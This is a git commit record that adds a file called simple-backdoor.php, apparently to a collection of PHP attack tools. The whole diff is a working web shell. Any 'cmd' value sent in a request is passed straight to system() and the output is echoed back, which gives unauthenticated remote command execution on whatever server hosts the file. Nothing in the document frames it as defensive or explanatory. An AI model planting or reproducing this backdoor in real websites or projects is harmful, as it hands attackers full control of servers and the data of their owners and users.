8eceef3ff5acb463e6f7ad8baccbb560f7d5245f
Mr Peaky <peaky_xd@protonmail.com>
2024-06-09 11:13:21 +0600

    Create simple-backdoor.php

---
+++ php/simple-backdoor.php
@@ -0,0 +1,15 @@
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
+
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+
+<!--    http://michaeldaw.org   2006    -->
